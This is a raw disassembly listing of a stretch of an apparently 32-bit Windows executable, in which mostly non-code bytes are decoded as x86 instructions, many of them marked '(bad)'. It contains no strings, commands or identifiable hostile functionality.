  4091ea:	dc fe                	fdivr  %st,%st(6)
  4091ec:	ff 1b                	lcall  *(%ebx)
  4091ee:	36 08 00             	or     %al,%ss:(%eax)
  4091f1:	5c                   	pop    %esp
  4091f2:	ff 4c ff 1c          	decl   0x1c(%edi,%edi,8)
  4091f6:	ff 0c ff             	decl   (%edi,%edi,8)
  4091f9:	1c 85                	sbb    $0x85,%al
  4091fb:	00 27                	add    %ah,(%edi)
  4091fd:	1c ff                	sbb    $0xff,%al
  4091ff:	27                   	daa
  409200:	2c ff                	sub    $0xff,%al
  409202:	3a fc                	cmp    %ah,%bh
  409204:	fe 03                	incb   (%ebx)
  409206:	00 4e 4c             	add    %cl,0x4c(%esi)
  409209:	ff 04 4c             	incl   (%esp,%ecx,2)
  40920c:	ff f5                	push   %ebp
  40920e:	10 00                	adc    %al,(%eax)
  409210:	00 00                	add    %al,(%eax)
  409212:	3a 3c ff             	cmp    (%edi,%edi,8),%bh
  409215:	04 00                	add    $0x0,%al
  409217:	4e                   	dec    %esi
  409218:	5c                   	pop    %esp
  409219:	ff 04 5c             	incl   (%esp,%ebx,2)
  40921c:	ff 0a                	decl   (%edx)
  40921e:	05 00 14 00 36       	add    $0x36001400,%eax
  409223:	08 00                	or     %al,(%eax)
  409225:	5c                   	pop    %esp
  409226:	ff 4c ff 2c          	decl   0x2c(%edi,%edi,8)
  40922a:	ff 1c ff             	lcall  *(%edi,%edi,8)
  40922d:	fd                   	std
  40922e:	95                   	xchg   %eax,%ebp
  40922f:	10 00                	adc    %al,(%eax)
  409231:	00 00                	add    %al,(%eax)
  409233:	00 6c 6b 40          	add    %ch,0x40(%ebx,%ebp,2)
  409237:	00 08                	add    %cl,(%eax)
  409239:	00 c0                	add    %al,%al
  40923b:	00 8c 00 28 00 00 00 	add    %cl,0x28(%eax,%eax,1)
  409242:	00 00                	add    %al,(%eax)
  409244:	00 00                	add    %al,(%eax)
  409246:	13 00                	adc    (%eax),%eax
  409248:	00 00                	add    %al,(%eax)
  40924a:	00 00                	add    %al,(%eax)
  40924c:	10 00                	adc    %al,(%eax)
  40924e:	00 00                	add    %al,(%eax)
  409250:	00 00                	add    %al,(%eax)
  409252:	01 00                	add    %eax,(%eax)
  409254:	00 00                	add    %al,(%eax)
  409256:	00 01                	add    %al,(%ecx)
  409258:	6c                   	insb   (%dx),%es:(%edi)
  409259:	ff 02                	incl   (%edx)
  40925b:	00 28                	add    %ch,(%eax)
  40925d:	00 00                	add    %al,(%eax)
  40925f:	00 00                	add    %al,(%eax)
  409261:	00 07                	add    %al,(%edi)
  409263:	00 00                	add    %al,(%eax)
  409265:	00 00                	add    %al,(%eax)
  409267:	00 5c ff 02          	add    %bl,0x2(%edi,%edi,8)
  40926b:	00 4c ff 02          	add    %cl,0x2(%edi,%edi,8)
  40926f:	00 2c ff             	add    %ch,(%edi,%edi,8)
  409272:	02 00                	add    (%eax),%al
  409274:	1c ff                	sbb    $0xff,%al
  409276:	02 00                	add    (%eax),%al
  409278:	0c ff                	or     $0xff,%al
  40927a:	02 00                	add    (%eax),%al
  40927c:	ec                   	in     (%dx),%al
  40927d:	fe 02                	incb   (%edx)
  40927f:	00 dc                	add    %bl,%ah
  409281:	fe 02                	incb   (%edx)
  409283:	00 00                	add    %al,(%eax)
  409285:	02 00                	add    (%eax),%al
  409287:	05 4b ff ff 00       	add    $0xffff4b,%eax
  40928c:	1c 0b                	sbb    $0xb,%al
  40928e:	08 00                	or     %al,(%eax)
  409290:	00 00                	add    %al,(%eax)
  409292:	23 74 ff 1b          	and    0x1b(%edi,%edi,8),%esi
  409296:	09 00                	or     %eax,(%eax)
  409298:	2a 46 64             	sub    0x64(%esi),%al
  40929b:	ff 0a                	decl   (%edx)
  40929d:	0a 00                	or     (%eax),%al
  40929f:	04 00                	add    $0x0,%al
  4092a1:	2f                   	das
  4092a2:	74 ff                	je     0x4092a3
  4092a4:	35 64 ff 00 1e       	xor    $0x1e00ff64,%eax
  4092a9:	f5                   	cmc
  4092aa:	00 00                	add    %al,(%eax)
  4092ac:	00 00                	add    %al,(%eax)
  4092ae:	1b 0b                	sbb    (%ebx),%ecx
  4092b0:	00 04 64             	add    %al,(%esp,%eiz,2)
  4092b3:	ff 0a                	decl   (%edx)
  4092b5:	01 00                	add    %eax,(%eax)
  4092b7:	0c 00                	or     $0x0,%al
  4092b9:	04 64                	add    $0x64,%al
  4092bb:	ff                   	(bad)
  4092bc:	fc                   	cld
  4092bd:	34 fc                	xor    $0xfc,%al
  4092bf:	f8                   	clc
  4092c0:	78 ff                	js     0x4092c1
  4092c2:	35 64 ff 00 45       	xor    $0x4500ff64,%eax
  4092c7:	0b 08                	or     (%eax),%ecx
  4092c9:	00 00                	add    %al,(%eax)
  4092cb:	00 23                	add    %ah,(%ebx)
  4092cd:	74 ff                	je     0x4092ce
  4092cf:	80 0c 00 2a          	orb    $0x2a,(%eax,%eax,1)
  4092d3:	46                   	inc    %esi
  4092d4:	40                   	inc    %eax
  4092d5:	ff 25 0b 08 00 00    	jmp    *0x80b
  4092db:	00 23                	add    %ah,(%ebx)
  4092dd:	60                   	pusha
  4092de:	ff 1b                	lcall  *(%ebx)
  4092e0:	09 00                	or     %eax,(%eax)
  4092e2:	2a 46 64             	sub    0x64(%esi),%al
  4092e5:	ff 25 08 78 ff fe    	jmp    *0xfeff7808
  4092eb:	9a 10 ff 0c 00 01 00 	lcall  $0x1,$0xcff10
  4092f2:	fd                   	std
  4092f3:	9f                   	lahf
  4092f4:	fe                   	(bad)
  4092f5:	98                   	cwtl
  4092f6:	0d 00 01 00 32       	or     $0x32000100,%eax
  4092fb:	04 00                	add    $0x0,%al
  4092fd:	74 ff                	je     0x4092fe
  4092ff:	60                   	pusha
  409300:	ff 36                	push   (%esi)
  409302:	06                   	push   %es
  409303:	00 64 ff 40          	add    %ah,0x40(%edi,%edi,8)
  409307:	ff 10                	call   *(%eax)
  409309:	ff 00                	incl   (%eax)
  40930b:	08 fc                	or     %bh,%ah
  40930d:	63 fc                	arpl   %edi,%esp
  40930f:	f8                   	clc
  409310:	78 ff                	js     0x409311
  409312:	00 00                	add    %al,(%eax)
  409314:	14 03                	adc    $0x3,%al
  409316:	00 00                	add    %al,(%eax)
  409318:	30 6e 40             	xor    %ch,0x40(%esi)
  40931b:	00 08                	add    %cl,(%eax)
  40931d:	00 6c 00 94          	add    %ch,-0x6c(%eax,%eax,1)
  409321:	00 28                	add    %ch,(%eax)
  409323:	00 00                	add    %al,(%eax)
  409325:	00 00                	add    %al,(%eax)
  409327:	00 00                	add    %al,(%eax)
  409329:	00 13                	add    %dl,(%ebx)
  40932b:	00 00                	add    %al,(%eax)
  40932d:	00 00                	add    %al,(%eax)
  40932f:	00 10                	add    %dl,(%eax)
  409331:	00 00                	add    %al,(%eax)
  409333:	00 00                	add    %al,(%eax)
  409335:	00 01                	add    %al,(%ecx)
  409337:	00 00                	add    %al,(%eax)
  409339:	00 00                	add    %al,(%eax)
  40933b:	00 78 ff             	add    %bh,-0x1(%eax)
  40933e:	03 00                	add    (%eax),%eax
  409340:	24 00                	and    $0x0,%al
  409342:	00 00                	add    %al,(%eax)
  409344:	00 00                	add    %al,(%eax)
  409346:	06                   	push   %es
  409347:	00 00                	add    %al,(%eax)
  409349:	00 00                	add    %al,(%eax)
  40934b:	00 74 ff 01          	add    %dh,0x1(%edi,%edi,8)
  40934f:	00 60 ff             	add    %ah,-0x1(%eax)
  409352:	01 00                	add    %eax,(%eax)
  409354:	64 ff 02             	incl   %fs:(%edx)
  409357:	00 40 ff             	add    %al,-0x1(%eax)
  40935a:	02 00                	add    (%eax),%al
  40935c:	20 ff                	and    %bh,%bh
  40935e:	02 00                	add    (%eax),%al
  409360:	10 ff                	adc    %bh,%bh
  409362:	02 00                	add    (%eax),%al
  409364:	4b                   	dec    %ebx
  409365:	93                   	xchg   %eax,%ebx
  409366:	00 fc                	add    %bh,%ah
  409368:	66 5c                	pop    %sp
  40936a:	ff                   	(bad)
  40936b:	fc                   	cld
  40936c:	f6 6c ff 80          	imulb  -0x80(%edi,%edi,8)
  409370:	10 00                	adc    %al,(%eax)
  409372:	f4                   	hlt
  409373:	01 f4                	add    %esi,%esp
  409375:	ff                   	(bad)
  409376:	fe                   	(bad)
  409377:	5d                   	pop    %ebp
  409378:	20 01                	and    %al,(%ecx)
  40937a:	80 14 00 f4          	adcb   $0xf4,(%eax,%eax,1)
  40937e:	02 f4                	add    %ah,%dh
  409380:	ff                   	(bad)
  409381:	fe                   	(bad)
  409382:	5d                   	pop    %ebp
  409383:	20 02                	and    %al,(%edx)
  409385:	f4                   	hlt
  409386:	01 5e 00             	add    %ebx,0x0(%esi)
  409389:	00 04 00             	add    %al,(%eax,%eax,1)
  40938c:	71 54                	jno    0x4093e2
  40938e:	ff f5                	push   %ebp
  409390:	00 00                	add    %al,(%eax)
  409392:	00 00                	add    %al,(%eax)
  409394:	6c                   	insb   (%dx),%es:(%edi)
  409395:	54                   	push   %esp
  409396:	ff 04 58             	incl   (%eax,%ebx,2)
  409399:	ff                   	(bad)
  40939a:	fe 8e 01 00 11 00    	decb   0x110001(%esi)
  4093a0:	01 00                	add    %eax,(%eax)
  4093a2:	80 00 f4             	addb   $0xf4,(%eax)
  4093a5:	01 04 58             	add    %eax,(%eax,%ebx,2)
  4093a8:	ff                   	(bad)
  4093a9:	ff 16                	call   *(%esi)
  4093ab:	01 00                	add    %eax,(%eax)
  4093ad:	f4                   	hlt
  4093ae:	02 04 58             	add    (%eax,%ebx,2),%al
  4093b1:	ff                   	(bad)
  4093b2:	ff 18                	lcall  *(%eax)
  4093b4:	01 00                	add    %eax,(%eax)
  4093b6:	f4                   	hlt
  4093b7:	02 04 44             	add    (%esp,%eax,2),%al
  4093ba:	ff 0a                	decl   (%edx)
  4093bc:	02 00                	add    (%eax),%al
  4093be:	04 00                	add    $0x0,%al
  4093c0:	04 44                	add    $0x44,%al
  4093c2:	ff 04 34             	incl   (%esp,%esi,1)
  4093c5:	ff 0a                	decl   (%edx)
  4093c7:	03 00                	add    (%eax),%eax
  4093c9:	08 00                	or     %al,(%eax)
  4093cb:	04 34                	add    $0x34,%al
  4093cd:	ff                   	(bad)
  4093ce:	fc                   	cld
  4093cf:	44                   	inc    %esp
  4093d0:	fd                   	std
  4093d1:	c2 32 ff             	ret    $0xff32
  4093d4:	f5                   	cmc
  4093d5:	01 00                	add    %eax,(%eax)
  4093d7:	00 00                	add    %al,(%eax)
  4093d9:	fc                   	cld
  4093da:	77 36                	ja     0x409412
  4093dc:	06                   	push   %es
  4093dd:	00 44 ff 34          	add    %al,0x34(%edi,%edi,8)
  4093e1:	ff 34 ff             	push   (%edi,%edi,8)
  4093e4:	f4                   	hlt
  4093e5:	01 fd                	add    %edi,%ebp
  4093e7:	3d f4 02 fd 3d       	cmp    $0x3dfd02f4,%eax
  4093ec:	63 5c ff fc          	arpl   %ebx,-0x4(%edi,%edi,8)
  4093f0:	f6 6c ff fd          	imulb  -0x3(%edi,%edi,8)
  4093f4:	95                   	xchg   %eax,%ebp
  4093f5:	10 00                	adc    %al,(%eax)
  4093f7:	fc                   	cld
  4093f8:	66 5c                	pop    %sp
  4093fa:	ff                   	(bad)
  4093fb:	fc                   	cld
  4093fc:	f6 6c ff f4          	imulb  -0xc(%edi,%edi,8)
  409400:	01 fd                	add    %edi,%ebp
  409402:	3d f4 02 fd 3d       	cmp    $0x3dfd02f4,%eax
  409407:	fd                   	std
  409408:	95                   	xchg   %eax,%ebp
  409409:	10 00                	adc    %al,(%eax)
  40940b:	00 bc 6a 40 00 10 00 	add    %bh,0x100040(%edx,%ebp,2)
  409412:	4c                   	dec    %esp
  409413:	00 a8 00 34 00 00    	add    %ch,0x3400(%eax)
  409419:	00 00                	add    %al,(%eax)
  40941b:	00 00                	add    %al,(%eax)
  40941d:	00 13                	add    %dl,(%ebx)
  40941f:	00 00                	add    %al,(%eax)
  409421:	00 00                	add    %al,(%eax)
  409423:	00 1a                	add    %bl,(%edx)
  409425:	00 00                	add    %al,(%eax)
  409427:	00 00                	add    %al,(%eax)
  409429:	00 02                	add    %al,(%edx)
  40942b:	00 00                	add    %al,(%eax)
  40942d:	00 00                	add    %al,(%eax)
  40942f:	01 6c ff 02          	add    %ebp,0x2(%edi,%edi,8)
  409433:	00 58 ff             	add    %bl,-0x1(%eax)
  409436:	05 01 00 00 00       	add    $0x1,%eax
  40943b:	00 00                	add    %al,(%eax)
  40943d:	00 00                	add    %al,(%eax)
  40943f:	00 14 00             	add    %dl,(%eax,%eax,1)
  409442:	00 00                	add    %al,(%eax)
  409444:	00 00                	add    %al,(%eax)
  409446:	02 00                	add    (%eax),%al
  409448:	00 00                	add    %al,(%eax)
  40944a:	00 00                	add    %al,(%eax)
  40944c:	44                   	inc    %esp
  40944d:	ff 02                	incl   (%edx)
  40944f:	00 34 ff             	add    %dh,(%edi,%edi,8)
  409452:	02 00                	add    (%eax),%al
  409454:	00 02                	add    %al,(%edx)
  409456:	00 05 4b ff ff 00    	add    %al,0xffff4b
  40945c:	1a f5                	sbb    %ch,%dh
  40945e:	00 00                	add    %al,(%eax)
  409460:	00 00                	add    %al,(%eax)
  409462:	1b 00                	sbb    (%eax),%eax
  409464:	00 04 3c             	add    %al,(%esp,%edi,1)
  409467:	ff 0a                	decl   (%edx)
  409469:	01 00                	add    %eax,(%eax)
  40946b:	0c 00                	or     $0x0,%al
  40946d:	04 3c                	add    $0x3c,%al
  40946f:	ff 04 6c             	incl   (%esp,%ebp,2)
  409472:	ff                   	(bad)
  409473:	fe 4e 00             	decb   0x0(%esi)
  409476:	15 28 0c ff 00       	adc    $0xff0c28,%eax
  40947b:	00 04 4c             	add    %al,(%esp,%ecx,2)
  40947e:	ff 28                	ljmp   *(%eax)
  409480:	1c ff                	sbb    $0xff,%al
  409482:	e8 03 fe 68 ec       	call   0xeca9928a
  409487:	fe                   	(bad)
  409488:	6d                   	insl   (%dx),%es:(%edi)
  409489:	00 00                	add    %al,(%eax)
  40948b:	2c 04                	sub    $0x4,%al
  40948d:	5c                   	pop    %esp
  40948e:	ff 27                	jmp    *(%edi)
  409490:	3c ff                	cmp    $0xff,%al
  409492:	0a 07                	or     (%edi),%al
  409494:	00 04 00             	add    %al,(%eax,%eax,1)
  409497:	f4                   	hlt
  409498:	64 eb b3             	fs jmp 0x40944e
  40949b:	e8 04 dc fe 0a       	call   0xb3f70a4
  4094a0:	03 00                	add    (%eax),%eax
  4094a2:	08 00                	or     %al,(%eax)
  4094a4:	04 dc                	add    $0xdc,%al
  4094a6:	fe                   	(bad)
  4094a7:	fb                   	sti
  4094a8:	ef                   	out    %eax,(%dx)
  4094a9:	cc                   	int3
  4094aa:	fe                   	(bad)
  4094ab:	fc                   	cld
  4094ac:	f6 5c ff 36          	negb   0x36(%edi,%edi,8)
  4094b0:	04 00                	add    $0x0,%al
  4094b2:	3c ff                	cmp    $0xff,%al
  4094b4:	dc fe                	fdivr  %st,%st(6)
  4094b6:	00 0b                	add    %cl,(%ebx)
  4094b8:	04 4c                	add    $0x4c,%al
  4094ba:	ff                   	(bad)
  4094bb:	fe                   	(bad)
  4094bc:	7e ec                	jle    0x4094aa
  4094be:	fe                   	(bad)
  4094bf:	36 00 00             	add    %al,%ss:(%eax)
  4094c2:	1f                   	pop    %ds
  4094c3:	fd                   	std
  4094c4:	1d 0c 00 63 2c       	sbb    $0x2c63000c,%eax
  4094c9:	ff 25 04 6c ff ff    	jmp    *0xffff6c04
  4094cf:	42                   	inc    %edx
  4094d0:	3c ff                	cmp    $0xff,%al
  4094d2:	04 00                	add    $0x0,%al
  4094d4:	02 00                	add    (%eax),%al
  4094d6:	fe                   	(bad)
  4094d7:	f7 bc fe 04 bc fe 71 	idivl  0x71febc04(%esi,%edi,8)
  4094de:	b8 fe 00 14 04       	mov    $0x41400fe,%eax
  4094e3:	5c                   	pop    %esp
  4094e4:	ff                   	(bad)
  4094e5:	fd                   	std
  4094e6:	93                   	xchg   %eax,%ebx
  4094e7:	0c 40                	or     $0x40,%al
  4094e9:	6c                   	insb   (%dx),%es:(%edi)
  4094ea:	b8 fe fd 9f fe       	mov    $0xfe9ffdfe,%eax
  4094ef:	98                   	cwtl
  4094f0:	05 00 01 00 00       	add    $0x100,%eax
  4094f5:	0d 6c b8 fe fd       	or     $0xfdfeb86c,%eax
  4094fa:	9f                   	lahf
  4094fb:	fe                   	(bad)
  4094fc:	98                   	cwtl
  4094fd:	06                   	push   %es
  4094fe:	00 00                	add    %al,(%eax)
  409500:	00 00                	add    %al,(%eax)
  409502:	0a f5                	or     %ch,%dh
  409504:	00 00                	add    %al,(%eax)
  409506:	00 00                	add    %al,(%eax)
  409508:	71 b8                	jno    0x4094c2
  40950a:	fe 00                	incb   (%eax)
  40950c:	00 14 00             	add    %dl,(%eax,%eax,1)
  40950f:	00 30                	add    %dh,(%eax)
  409511:	6e                   	outsb  %ds:(%esi),(%dx)
  409512:	40                   	inc    %eax
  409513:	00 08                	add    %cl,(%eax)
  409515:	00 c4                	add    %al,%ah
  409517:	00 bc 00 3c 00 00 00 	add    %bh,0x3c(%eax,%eax,1)
  40951e:	00 00                	add    %al,(%eax)
  409520:	00 00                	add    %al,(%eax)
  409522:	13 00                	adc    (%eax),%eax
  409524:	00 00                	add    %al,(%eax)
  409526:	00 00                	add    %al,(%eax)
  409528:	24 00                	and    $0x0,%al
  40952a:	00 00                	add    %al,(%eax)
  40952c:	00 00                	add    %al,(%eax)
  40952e:	06                   	push   %es
  40952f:	00 00                	add    %al,(%eax)
  409531:	00 00                	add    %al,(%eax)
  409533:	00 fc                	add    %bh,%ah
  409535:	fe 02                	incb   (%edx)
  409537:	00 ec                	add    %ch,%ah
  409539:	fe 02                	incb   (%edx)
  40953b:	00 bc fe 02 00 4c ff 	add    %bh,-0xb3fffe(%esi,%edi,8)
  409542:	02 00                	add    (%eax),%al
  409544:	5c                   	pop    %esp
  409545:	ff 02                	incl   (%edx)
  409547:	00 6c ff 02          	add    %ch,0x2(%edi,%edi,8)
  40954b:	00 18                	add    %bl,(%eax)
  40954d:	00 00                	add    %al,(%eax)
  40954f:	00 00                	add    %al,(%eax)
  409551:	00 03                	add    %al,(%ebx)
  409553:	00 00                	add    %al,(%eax)
  409555:	00 00                	add    %al,(%eax)
  409557:	00 3c ff             	add    %bh,(%edi,%edi,8)
  40955a:	02 00                	add    (%eax),%al
  40955c:	dc fe                	fdivr  %st,%st(6)
  40955e:	02 00                	add    (%eax),%al
  409560:	cc                   	int3
  409561:	fe 02                	incb   (%edx)
  409563:	00 27                	add    %ah,(%edi)
  409565:	58                   	pop    %eax
  409566:	ff 0a                	decl   (%edx)
  409568:	00 00                	add    %al,(%eax)
  40956a:	04 00                	add    $0x0,%al
  40956c:	35 58 ff 3a 68       	xor    $0x683aff58,%eax
  409571:	ff 01                	incl   (%ecx)
  409573:	00 fd                	add    %bh,%ch
  409575:	00 38                	add    %bh,(%eax)
  409577:	ff                   	(bad)
  409578:	3a 68 ff             	cmp    -0x1(%eax),%ch
  40957b:	02 00                	add    (%eax),%al
  40957d:	fd                   	std
  40957e:	00 28                	add    %ch,(%eax)
  409580:	ff                   	(bad)
  409581:	3a 68 ff             	cmp    -0x1(%eax),%ch
  409584:	03 00                	add    (%eax),%eax
  409586:	fd                   	std
  409587:	00 18                	add    %bl,(%eax)
  409589:	ff 1b                	lcall  *(%ebx)
  40958b:	04 00                	add    $0x0,%al
  40958d:	43                   	inc    %ebx
  40958e:	14 ff                	adc    $0xff,%al
  409590:	27                   	daa
  409591:	58                   	pop    %eax
  409592:	ff 0a                	decl   (%edx)
  409594:	05 00 04 00 f4       	add    $0xf4000400,%eax
  409599:	1e                   	push   %ds
  40959a:	eb b3                	jmp    0x40954f
  40959c:	fb                   	sti
  40959d:	e6 73                	out    %al,$0x73
  40959f:	10 ff                	adc    %bh,%bh
  4095a1:	35 58 ff 6e 10       	xor    $0x106eff58,%eax
  4095a6:	ff f4                	push   %esp
  4095a8:	00 eb                	add    %ch,%bl
  4095aa:	c8 1c 54 00          	enter  $0x541c,$0x0
  4095ae:	04 38                	add    $0x38,%al
  4095b0:	ff                   	(bad)
  4095b1:	fd                   	std
  4095b2:	00 48 ff             	add    %cl,-0x1(%eax)
  4095b5:	1e                   	push   %ds
  4095b6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4095b7:	00 6e 10             	add    %ch,0x10(%esi)
  4095ba:	ff f4                	push   %esp
  4095bc:	01 eb                	add    %ebp,%ebx
  4095be:	c8 1c 68 00          	enter  $0x681c,$0x0
  4095c2:	04 28                	add    $0x28,%al
  4095c4:	ff                   	(bad)
  4095c5:	fd                   	std
  4095c6:	00 48 ff             	add    %cl,-0x1(%eax)
  4095c9:	1e                   	push   %ds
  4095ca:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4095cb:	00 6e 10             	add    %ch,0x10(%esi)
  4095ce:	ff f4                	push   %esp
  4095d0:	02 eb                	add    %bl,%ch
  4095d2:	c8 1c 7c 00          	enter  $0x7c1c,$0x0
  4095d6:	04 18                	add    $0x18,%al
  4095d8:	ff                   	(bad)
  4095d9:	fd                   	std
  4095da:	00 48 ff             	add    %cl,-0x1(%eax)
  4095dd:	1e                   	push   %ds
  4095de:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4095df:	00 6e 10             	add    %ch,0x10(%esi)
  4095e2:	ff f4                	push   %esp
  4095e4:	03 eb                	add    %ebx,%ebp
  4095e6:	c8 1c 93 00          	enter  $0x931c,$0x0
  4095ea:	6c                   	insb   (%dx),%es:(%edi)
  4095eb:	14 ff                	adc    $0xff,%al
  4095ed:	46                   	inc    %esi
  4095ee:	68 ff fd 00 48       	push   $0x4800fdff
  4095f3:	ff 1e                	lcall  *(%esi)
  4095f5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4095f6:	00 6e 10             	add    %ch,0x10(%esi)
  4095f9:	ff f4                	push   %esp
  4095fb:	04 eb                	add    $0xeb,%al
  4095fd:	c8 1c a4 00          	enter  $0xa41c,$0x0
  409601:	04 38                	add    $0x38,%al
  409603:	ff                   	(bad)
  409604:	fd                   	std
  409605:	00 48 ff             	add    %cl,-0x1(%eax)
  409608:	04 48                	add    $0x48,%al
  40960a:	ff                   	(bad)
  40960b:	3a 68 ff             	cmp    -0x1(%eax),%ch
  40960e:	06                   	push   %es
  40960f:	00 5d fb             	add    %bl,-0x5(%ebp)
  409612:	33 1c b9             	xor    (%ecx,%edi,4),%ebx
  409615:	00 04 38             	add    %al,(%eax,%edi,1)
  409618:	ff                   	(bad)
  409619:	fd                   	std
  40961a:	00 48 ff             	add    %cl,-0x1(%eax)
  40961d:	04 48                	add    $0x48,%al
  40961f:	ff                   	(bad)
  409620:	fc                   	cld
  409621:	02 31                	add    (%ecx),%dh
  409623:	78 ff                	js     0x409624
  409625:	14 00                	adc    $0x0,%al
  409627:	00 30                	add    %dh,(%eax)
  409629:	6c                   	insb   (%dx),%es:(%edi)
  40962a:	40                   	inc    %eax
  40962b:	00 04 00             	add    %al,(%eax,%eax,1)
  40962e:	6c                   	insb   (%dx),%es:(%edi)
  40962f:	00 c4                	add    %al,%ah
  409631:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409634:	00 00                	add    %al,(%eax)
  409636:	00 00                	add    %al,(%eax)
  409638:	00 00                	add    %al,(%eax)
  40963a:	13 00                	adc    (%eax),%eax
  40963c:	00 00                	add    %al,(%eax)
  40963e:	00 00                	add    %al,(%eax)
  409640:	24 00                	and    $0x0,%al
  409642:	00 00                	add    %al,(%eax)
  409644:	00 00                	add    %al,(%eax)
  409646:	06                   	push   %es
  409647:	00 00                	add    %al,(%eax)
  409649:	00 00                	add    %al,(%eax)
  40964b:	01 78 ff             	add    %edi,-0x1(%eax)
  40964e:	01 00                	add    %eax,(%eax)
  409650:	38 ff                	cmp    %bh,%bh
  409652:	02 00                	add    (%eax),%al
  409654:	28 ff                	sub    %bh,%bh
  409656:	02 00                	add    (%eax),%al
  409658:	48                   	dec    %eax
  409659:	ff 02                	incl   (%edx)
  40965b:	00 18                	add    %bl,(%eax)
  40965d:	ff 02                	incl   (%edx)
  40965f:	00 14 ff             	add    %dl,(%edi,%edi,8)
  409662:	01 00                	add    %eax,(%eax)
  409664:	10 00                	adc    %al,(%eax)
  409666:	00 00                	add    %al,(%eax)
  409668:	00 00                	add    %al,(%eax)
  40966a:	01 00                	add    %eax,(%eax)
  40966c:	00 00                	add    %al,(%eax)
  40966e:	00 00                	add    %al,(%eax)
  409670:	58                   	pop    %eax
  409671:	ff 02                	incl   (%edx)
  409673:	00 00                	add    %al,(%eax)
  409675:	02 00                	add    (%eax),%al
  409677:	05 4b ff ff 00       	add    $0xffff4b,%eax
  40967c:	36 04 74             	ss add $0x74,%al
  40967f:	ff f5                	push   %ebp
  409681:	3f                   	aas
  409682:	00 0f                	add    %cl,(%edi)
  409684:	00 f5                	add    %dh,%ch
  409686:	00 00                	add    %al,(%eax)
  409688:	00 00                	add    %al,(%eax)
  40968a:	80 10 00             	adcb   $0x0,(%eax)
  40968d:	04 6c                	add    $0x6c,%al
  40968f:	ff 34 6c             	push   (%esp,%ebp,2)
  409692:	6c                   	insb   (%dx),%es:(%edi)
  409693:	ff 80 0c 00 5e 02    	incl   0x25e000c(%eax)
  409699:	00 14 00             	add    %dl,(%eax,%eax,1)
  40969c:	71 68                	jno    0x409706
  40969e:	ff                   	(bad)
  40969f:	3c 6c                	cmp    $0x6c,%al
  4096a1:	6c                   	insb   (%dx),%es:(%edi)
  4096a2:	ff 6c 10 00          	ljmp   *0x0(%eax,%edx,1)
  4096a6:	fc                   	cld
  4096a7:	58                   	pop    %eax
  4096a8:	6c                   	insb   (%dx),%es:(%edi)
  4096a9:	68 ff 71 70 ff       	push   $0xff7071ff
  4096ae:	2f                   	das
  4096af:	6c                   	insb   (%dx),%es:(%edi)
  4096b0:	ff 00                	incl   (%eax)
  4096b2:	0e                   	push   %cs
  4096b3:	6c                   	insb   (%dx),%es:(%edi)
  4096b4:	70 ff                	jo     0x4096b5
  4096b6:	f5                   	cmc
  4096b7:	00 00                	add    %al,(%eax)
  4096b9:	00 00                	add    %al,(%eax)
  4096bb:	cc                   	int3
  4096bc:	1c 69                	sbb    $0x69,%al
  4096be:	00 00                	add    %al,(%eax)
  4096c0:	07                   	pop    %es
  4096c1:	f4                   	hlt
  4096c2:	00 70 7a             	add    %dh,0x7a(%eax)
  4096c5:	ff 00                	incl   (%eax)
  4096c7:	14 6c                	adc    $0x6c,%al
  4096c9:	74 ff                	je     0x4096ca
  4096cb:	5e                   	pop    %esi
  4096cc:	03 00                	add    (%eax),%eax
  4096ce:	04 00                	add    $0x0,%al
  4096d0:	71 68                	jno    0x40973a
  4096d2:	ff                   	(bad)
  4096d3:	3c 6c                	cmp    $0x6c,%al
  4096d5:	68 ff 71 70 ff       	push   $0xff7071ff
  4096da:	00 03                	add    %al,(%ebx)
  4096dc:	15 00 02 00 0d       	adc    $0xd000200,%eax
  4096e1:	80 14 00 1b          	adcb   $0x1b,(%eax,%eax,1)
  4096e5:	05 00 fb 30 1c       	add    $0x1c30fb00,%eax
  4096ea:	81 00 00 09 80 10    	addl   $0x10800900,(%eax)
  4096f0:	00 fd                	add    %bh,%ch
  4096f2:	31 14 00             	xor    %edx,(%eax,%eax,1)
  4096f5:	00 29                	add    %ch,(%ecx)
  4096f7:	80 14 00 04          	adcb   $0x4,(%eax,%eax,1)
  4096fb:	6c                   	insb   (%dx),%es:(%edi)
  4096fc:	ff 34 6c             	push   (%esp,%ebp,2)
  4096ff:	6c                   	insb   (%dx),%es:(%edi)
  409700:	ff 6c 74 ff          	ljmp   *-0x1(%esp,%esi,2)
  409704:	5e                   	pop    %esi
  409705:	15 00 08 00 71       	adc    $0x71000800,%eax
  40970a:	68 ff 3c 6c 6c       	push   $0x6c6c3cff
  40970f:	ff 6c 14 00          	ljmp   *0x0(%esp,%edx,1)
  409713:	fc                   	cld
  409714:	58                   	pop    %eax
  409715:	6c                   	insb   (%dx),%es:(%edi)
  409716:	68 ff 71 70 ff       	push   $0xff7071ff
  40971b:	2f                   	das
  40971c:	6c                   	insb   (%dx),%es:(%edi)
  40971d:	ff 00                	incl   (%eax)
  40971f:	0e                   	push   %cs
  409720:	6c                   	insb   (%dx),%es:(%edi)
  409721:	70 ff                	jo     0x409722
  409723:	f5                   	cmc
  409724:	00 00                	add    %al,(%eax)
  409726:	00 00                	add    %al,(%eax)
  409728:	c7                   	(bad)
  409729:	1c c2                	sbb    $0xc2,%al
  40972b:	00 00                	add    %al,(%eax)
  40972d:	07                   	pop    %es
  40972e:	f4                   	hlt
  40972f:	ff 70 7a             	push   0x7a(%eax)
  409732:	ff 1e                	lcall  *(%esi)
  409734:	cb                   	lret
  409735:	00 00                	add    %al,(%eax)
  409737:	02 00                	add    (%eax),%al
  409739:	07                   	pop    %es
  40973a:	f4                   	hlt
  40973b:	00 70 7a             	add    %dh,0x7a(%eax)
  40973e:	ff 00                	incl   (%eax)
  409740:	02 00                	add    (%eax),%al
  409742:	14 6c                	adc    $0x6c,%al
  409744:	74 ff                	je     0x409745
  409746:	5e                   	pop    %esi
  409747:	03 00                	add    (%eax),%eax
  409749:	04 00                	add    $0x0,%al
  40974b:	71 68                	jno    0x4097b5
  40974d:	ff                   	(bad)
  40974e:	3c 6c                	cmp    $0x6c,%al
  409750:	68 ff 71 70 ff       	push   $0xff7071ff
  409755:	00 00                	add    %al,(%eax)
  409757:	15 8c 71 40 00       	adc    $0x40718c,%eax
  40975c:	10 00                	adc    %al,(%eax)
  40975e:	14 00                	adc    $0x0,%al
  409760:	e4 00                	in     $0x0,%al
  409762:	24 00                	and    $0x0,%al
	...
